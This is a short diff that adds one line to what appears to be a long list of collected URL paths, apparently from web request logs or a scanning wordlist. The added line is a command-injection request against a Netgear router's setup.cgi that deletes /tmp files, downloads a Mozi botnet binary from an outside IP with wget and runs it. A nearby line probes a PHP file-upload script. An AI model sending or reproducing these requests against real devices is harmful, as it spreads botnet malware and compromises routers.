@@ -19750,3 +19750,4 @@ apiv4.9hits.com:443
 /?route=product/search&tag=5
 /figs-loso-gold-figs-30-50-cm?tag=&page=73
 /wp-22.php?sfilename=bdkr28tools.php&sfilecontent=&supfiles=
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.152.118.80:43317/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
